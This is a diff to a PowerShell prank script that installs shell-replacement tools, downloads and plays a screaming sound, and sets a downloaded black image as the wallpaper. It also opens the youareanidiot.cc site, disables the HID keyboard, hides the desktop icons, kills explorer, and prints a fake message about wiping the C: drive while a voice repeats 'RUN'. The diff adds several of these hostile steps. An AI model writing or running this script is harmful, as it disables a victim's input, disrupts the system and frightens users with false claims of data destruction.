@@ -1,18 +1,27 @@
 Write-Host "Script Started"
-$progressPreference = 'silentlyContinue'
 Write-Information "Downloading WinGet and its dependencies..."
 Invoke-WebRequest -Uri https://aka.ms/getwinget -OutFile Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle
+Write-Host "Uri1 Completed"
 Invoke-WebRequest -Uri https://aka.ms/Microsoft.VCLibs.x64.14.00.Desktop.appx -OutFile Microsoft.VCLibs.x64.14.00.Desktop.appx
+Write-Host "Uri2 Completed"
 Invoke-WebRequest -Uri https://github.com/microsoft/microsoft-ui-xaml/releases/download/v2.8.6/Microsoft.UI.Xaml.2.8.x64.appx -OutFile Microsoft.UI.Xaml.2.8.x64.appx
+Write-Host "Uri3 Completed, starting extraction"
 Add-AppxPackage Microsoft.VCLibs.x64.14.00.Desktop.appx
 Add-AppxPackage Microsoft.UI.Xaml.2.8.x64.appx
 Add-AppxPackage Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle
 Write-Host "Installed Winget... Started Curl Process"
+mspaint.exe
 
 
 winget install --id=dremin.RetroBar  -e --source winget
-conhost powershell retrobar
+conhost cmd retrobar
 winget install --id=valinet.ExplorerPatcher  -e --source winget
+
+
+curl https://static.wikia.nocookie.net/regretevator/images/6/67/Jaoba_screaming.wav/revision/latest?cb=20240913065709 > %temp%\jaoba.wav
+$PlayWav=New-Object System.Media.SoundPlayer
+$PlayWav.SoundLocation='%temp%\jaoba.wav'
+$PlayWav.playsync()
 
 $setwallpapersrc = @"
 using System.Runtime.InteropServices;
@@ -31,7 +40,8 @@ public class Wallpaper
 }
 "@
 Add-Type -TypeDefinition $setwallpapersrc
-[Wallpaper]::SetWallpaper("C:\Windows\web\Wallpaper\Windows\img0.jpg")
+curl https://blackscreen.space/images/pro/black-screen_39.png > %temp%\tempimg.png
+[Wallpaper]::SetWallpaper("%temp%\tempimg.png")
 
 winget install -e --id Mozilla.Firefox --source winget
 firefox https://youareanidiot.cc
@@ -41,7 +51,7 @@ Get-PnpDevice -FriendlyName 'HID Keyboard Device' | Disable-PnpDevice -ErrorActi
 
 $Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
 Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1
-Get-Process "explorer"| Stop-Process
+Get-Process "explorer" | Stop-Process
 
 echo "Wiping C: ... task busy"
 Start-Sleep -Seconds 5
@@ -50,7 +60,7 @@ echo "Operation Completed Successfully"
 
 $voice = New-Object -ComObject Sapi.spvoice
 $voice.rate = 0
-$voice.speak("RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN")
+$voice.speak("Narrator enabled RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN")
 
 conhost cmd exit
 Write-Host "Restoring your mother in 60 seconds..."
